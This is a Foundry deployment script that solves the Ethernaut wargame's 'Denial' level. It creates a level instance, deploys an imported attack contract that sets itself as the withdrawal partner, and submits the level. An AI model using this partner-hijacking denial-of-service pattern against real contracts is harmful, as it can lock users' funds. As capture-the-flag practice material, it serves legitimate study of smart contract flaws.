// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Denial } from "src/Level20.sol";
import { L20Attack } from "src/Level20Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance{ value: 0.001 ether }(0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address payable instanceAddress = payable(address(uint160(uint256(entries[0].topics[2]))));
        console2.log(instanceAddress);
        Denial instance = Denial(instanceAddress);

        new L20Attack(instance); // sets the partner to itself

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
